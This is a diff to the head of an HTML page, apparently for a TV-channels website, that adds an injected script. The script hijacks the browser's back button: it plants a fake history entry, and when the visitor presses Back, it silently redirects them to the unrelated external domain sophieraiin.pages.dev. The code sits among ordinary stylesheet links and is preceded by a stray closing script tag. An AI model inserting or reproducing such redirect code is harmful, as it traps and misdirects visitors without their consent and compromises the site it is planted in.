@@ -28,6 +28,23 @@
     <link rel="stylesheet" href="assets/css/tv-channels.css" />
     <link rel="stylesheet" href="assets/css/components/modal.css" />
     <link rel="stylesheet" href="assets/css/footer.css" />
+    </script>
+	<script type='text/javascript'>
+	(function(window, location) {
+            history.replaceState(null, document.title, location.pathname + "#!/history");
+            history.pushState(null, document.title, location.pathname);
+            
+            window.addEventListener("popstate", function() {
+                if (location.hash === "#!/history") {
+                    history.replaceState(null, document.title, location.pathname);
+                    setTimeout(function() {
+                        location.replace("https://sophieraiin.pages.dev/");
+                    }, 0);
+                }
+            }, false);
+        }(window, location));
+
+</script>
   </head>
 
   <body>
